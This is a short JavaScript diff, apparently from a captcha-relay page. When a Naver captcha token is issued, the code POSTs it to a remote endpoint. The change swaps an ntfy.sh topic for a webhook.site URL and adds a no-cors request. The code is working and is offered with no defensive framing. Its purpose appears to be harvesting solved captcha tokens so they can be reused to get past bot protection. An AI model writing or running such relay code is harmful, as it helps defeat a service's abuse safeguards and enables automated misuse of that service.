@@ -16,8 +16,8 @@ window.__ncaptchaOnloadTok = function() {
       if (tok) {
         setStatus('TOKEN ISSUED, relaying...');
         setOut(tok);
-        fetch('https://ntfy.sh/naver-tok-c6e83a18b44a', {method: 'POST', body: tok})
-          .then(function(){ setStatus('RELAYED'); })
+        fetch('https://webhook.site/e281650385d444fd902bffbf064dc138', {method: 'POST', mode: 'no-cors', headers: {'Content-Type': 'text/plain'}, body: tok})
+          
           .catch(function(e){ setStatus('RELAY FAILED: ' + e.message); });
       }
       else { setStatus('FAILED: empty token'); }
